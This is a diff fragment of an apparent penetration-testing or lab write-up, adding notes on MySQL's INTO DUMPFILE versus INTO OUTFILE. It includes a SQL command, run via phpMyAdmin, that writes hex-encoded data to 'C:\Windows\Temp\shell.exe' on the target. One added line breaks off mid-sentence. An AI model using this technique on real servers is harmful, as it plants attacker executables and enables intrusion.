@@ -125,4 +125,15 @@ head -c 8 shell.hex
 ```
 
 now we have two options `dumpfile` and `outfile`
-dumpfile will be used for binary data and outfile
+⚠️ **DUMPFILE vs OUTFILE**
+
+| Command         | Use for                    | Behaviour                                        |
+| --------------- | -------------------------- | ------------------------------------------------ |
+| `INTO DUMPFILE` | Binary files (exe, dll)    | Writes raw bytes exactly ✅                       |
+| `INTO OUTFILE`  | Text files (bat, xml, ps1) | Adds newlines, escapes chars — breaks binaries ❌ |
+
+executed this command on phpmyadmin to e
+
+```sql
+SELECT 0x[your hex data] INTO DUMPFILE 'C:\\Windows\\Temp\\shell.exe'
+```
